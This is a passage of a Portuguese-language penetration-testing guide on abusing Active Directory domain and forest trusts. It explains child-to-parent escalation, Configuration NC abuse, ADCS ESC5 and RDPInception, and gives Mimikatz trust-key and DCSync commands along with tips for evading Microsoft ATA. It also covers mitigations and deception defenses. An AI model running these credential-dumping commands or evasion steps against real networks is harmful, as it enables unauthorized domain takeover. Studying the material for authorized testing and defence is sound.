- **Confianças de Floresta**: Este tipo de confiança é uma confiança transitiva bidirecional entre dois domínios raiz de floresta, também aplicando filtragem de SID para melhorar as medidas de segurança.
- **Confianças MIT**: Essas confianças são estabelecidas com domínios Kerberos não Windows, [compatíveis com RFC4120](https://tools.ietf.org/html/rfc4120). As confianças MIT são um pouco mais especializadas e atendem a ambientes que exigem integração com sistemas baseados em Kerberos fora do ecossistema Windows.

#### Outras diferenças nas **relações de confiança**

- Uma relação de confiança também pode ser **transitiva** (A confia em B, B confia em C, então A confia em C) ou **não transitiva**.
- Uma relação de confiança pode ser configurada como **confiança bidirecional** (ambos confiam um no outro) ou como **confiança unidirecional** (apenas um deles confia no outro).

### Caminho de Ataque

1. **Enumerar** as relações de confiança
2. Verifique se algum **principal de segurança** (usuário/grupo/computador) tem **acesso** a recursos do **outro domínio**, talvez por entradas ACE ou por estar em grupos do outro domínio. Procure por **relações entre domínios** (a confiança foi criada para isso, provavelmente).
1. Kerberoast, neste caso, poderia ser outra opção.
3. **Comprometer** as **contas** que podem **pivotar** entre domínios.

Os atacantes poderiam acessar recursos em outro domínio através de três mecanismos principais:

- **Membro de Grupo Local**: Os principais podem ser adicionados a grupos locais em máquinas, como o grupo “Administradores” em um servidor, concedendo-lhes controle significativo sobre essa máquina.
- **Membro de Grupo de Domínio Estrangeiro**: Os principais também podem ser membros de grupos dentro do domínio estrangeiro. No entanto, a eficácia desse método depende da natureza da confiança e do escopo do grupo.
- **Listas de Controle de Acesso (ACLs)**: Os principais podem ser especificados em uma **ACL**, particularmente como entidades em **ACEs** dentro de um **DACL**, proporcionando-lhes acesso a recursos específicos. Para aqueles que desejam se aprofundar na mecânica de ACLs, DACLs e ACEs, o whitepaper intitulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” é um recurso inestimável.

### Escalonamento de privilégios de floresta de filho para pai
```
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
> [!WARNING]
> Existem **2 chaves confiáveis**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
> Você pode usar a que está sendo utilizada pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### Injeção de SID-History

Escale como administrador da empresa para o domínio filho/pai abusando da confiança com injeção de SID-History:

{{#ref}}
sid-history-injection.md
{{#endref}}

#### Explorar NC de Configuração gravável

Entender como o Contexto de Nomeação de Configuração (NC) pode ser explorado é crucial. O NC de Configuração serve como um repositório central para dados de configuração em ambientes do Active Directory (AD). Esses dados são replicados para todos os Controladores de Domínio (DC) dentro da floresta, com DCs graváveis mantendo uma cópia gravável do NC de Configuração. Para explorar isso, é necessário ter **privilégios de SYSTEM em um DC**, preferencialmente um DC filho.

**Vincular GPO ao site do DC raiz**

O contêiner de Sites do NC de Configuração inclui informações sobre todos os sites de computadores associados ao domínio dentro da floresta AD. Ao operar com privilégios de SYSTEM em qualquer DC, os atacantes podem vincular GPOs aos sites do DC raiz. Essa ação potencialmente compromete o domínio raiz manipulando políticas aplicadas a esses sites.

Para informações detalhadas, pode-se explorar pesquisas sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Comprometer qualquer gMSA na floresta**

Um vetor de ataque envolve direcionar gMSAs privilegiados dentro do domínio. A chave raiz do KDS, essencial para calcular as senhas dos gMSAs, é armazenada dentro do NC de Configuração. Com privilégios de SYSTEM em qualquer DC, é possível acessar a chave raiz do KDS e calcular as senhas para qualquer gMSA na floresta.

Análise detalhada pode ser encontrada na discussão sobre [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Ataque de mudança de esquema**

Esse método requer paciência, aguardando a criação de novos objetos AD privilegiados. Com privilégios de SYSTEM, um atacante pode modificar o Esquema do AD para conceder a qualquer usuário controle total sobre todas as classes. Isso pode levar a acesso não autorizado e controle sobre novos objetos AD criados.

Leitura adicional está disponível sobre [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**De DA para EA com ADCS ESC5**

A vulnerabilidade ADCS ESC5 visa o controle sobre objetos de Infraestrutura de Chave Pública (PKI) para criar um modelo de certificado que permite autenticação como qualquer usuário dentro da floresta. Como os objetos PKI residem no NC de Configuração, comprometer um DC filho gravável permite a execução de ataques ESC5.

Mais detalhes sobre isso podem ser lidos em [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Em cenários sem ADCS, o atacante tem a capacidade de configurar os componentes necessários, conforme discutido em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Domínio de Floresta Externa - Unidirecional (Inbound) ou bidirecional
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Neste cenário, **seu domínio é confiável** por um externo, concedendo a você **permissões indeterminadas** sobre ele. Você precisará descobrir **quais princípios do seu domínio têm qual acesso sobre o domínio externo** e, em seguida, tentar explorá-lo:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domínio de Floresta Externa - Unidirecional (Saída)
```powershell
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário, **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

No entanto, quando um **domínio é confiável** pelo domínio confiável, o domínio confiável **cria um usuário** com um **nome previsível** que usa como **senha a senha confiável**. O que significa que é possível **acessar um usuário do domínio confiável para entrar no confiável** para enumerá-lo e tentar escalar mais privilégios:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra maneira de comprometer o domínio confiável é encontrar um [**link SQL confiável**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** da confiança do domínio (o que não é muito comum).

Outra maneira de comprometer o domínio confiável é esperar em uma máquina onde um **usuário do domínio confiável pode acessar** para fazer login via **RDP**. Então, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir daí.\
Além disso, se a **vítima montou seu disco rígido**, a partir do processo da **sessão RDP**, o atacante poderia armazenar **backdoors** na **pasta de inicialização do disco rígido**. Essa técnica é chamada de **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação de abuso de confiança de domínio

### **Filtragem de SID:**

- O risco de ataques que aproveitam o atributo de histórico de SID em confianças de floresta é mitigado pela Filtragem de SID, que é ativada por padrão em todas as confianças inter-floresta. Isso é fundamentado na suposição de que as confianças intra-floresta são seguras, considerando a floresta, em vez do domínio, como o limite de segurança, de acordo com a posição da Microsoft.
- No entanto, há um problema: a filtragem de SID pode interromper aplicativos e o acesso do usuário, levando à sua desativação ocasional.

### **Autenticação Seletiva:**

- Para confianças inter-floresta, a utilização da Autenticação Seletiva garante que os usuários das duas florestas não sejam autenticados automaticamente. Em vez disso, permissões explícitas são necessárias para que os usuários acessem domínios e servidores dentro do domínio ou floresta confiável.
- É importante notar que essas medidas não protegem contra a exploração do Contexto de Nomeação de Configuração (NC) gravável ou ataques à conta de confiança.

[**Mais informações sobre confianças de domínio em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## AD -> Azure & Azure -> AD

{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas Defesas Gerais

[**Saiba mais sobre como proteger credenciais aqui.**](../stealing-credentials/credentials-protections.md)

### **Medidas Defensivas para Proteção de Credenciais**

- **Restrições de Administradores de Domínio**: Recomenda-se que os Administradores de Domínio só possam fazer login em Controladores de Domínio, evitando seu uso em outros hosts.
- **Privilégios de Conta de Serviço**: Serviços não devem ser executados com privilégios de Administrador de Domínio (DA) para manter a segurança.
- **Limitação Temporal de Privilégios**: Para tarefas que requerem privilégios de DA, sua duração deve ser limitada. Isso pode ser alcançado por: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementando Técnicas de Engano**

- Implementar engano envolve a configuração de armadilhas, como usuários ou computadores de isca, com características como senhas que não expiram ou são marcadas como Confiáveis para Delegação. Uma abordagem detalhada inclui a criação de usuários com direitos específicos ou adicioná-los a grupos de alto privilégio.
- Um exemplo prático envolve o uso de ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mais sobre a implementação de técnicas de engano pode ser encontrado em [Deploy-Deception no GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando Engano**

- **Para Objetos de Usuário**: Indicadores suspeitos incluem ObjectSID atípico, logons infrequentes, datas de criação e contagens baixas de senhas incorretas.
- **Indicadores Gerais**: Comparar atributos de objetos de isca potenciais com os de objetos genuínos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar tais enganos.

### **Evitando Sistemas de Detecção**

- **Bypass de Detecção do Microsoft ATA**:
- **Enumeração de Usuários**: Evitar a enumeração de sessões em Controladores de Domínio para prevenir a detecção pelo ATA.
- **Imitação de Ticket**: Utilizar chaves **aes** para a criação de tickets ajuda a evitar a detecção ao não rebaixar para NTLM.
- **Ataques DCSync**: Executar a partir de um controlador de domínio não é recomendado para evitar a detecção pelo ATA, pois a execução direta a partir de um Controlador de Domínio acionará alertas.

## Referências

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

{{#include ../../banners/hacktricks-training.md}}
